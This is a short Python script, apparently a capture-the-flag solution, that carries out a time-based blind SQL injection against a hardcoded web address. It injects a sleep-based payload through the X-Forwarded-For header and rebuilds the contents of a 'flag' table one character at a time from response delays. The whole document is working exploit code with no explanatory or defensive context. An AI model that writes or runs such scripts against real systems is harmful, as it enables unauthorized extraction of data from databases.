import requests
import time
import string

s=r"asd' or (select case when (substring((select flag from flag ) from %d for 1 )='%c') then sleep(5) else sleep(0) end))#"
_goon=True
i=0
chars=string.ascii_letters+string.digits+"{}"
se=requests.session()
u=r'http://120.24.86.145:8002/web15/'
flag=[]
while(_goon):
    _goon=False
    i+=1
    for c in chars:
        _start=time.time()
        r=se.get(u,headers={'x-forwarded-for':s%(i,c)})
        if time.time()-_start>3:
            #print c
            flag.append(c)
            _goon=True
            break
print ''.join(flag)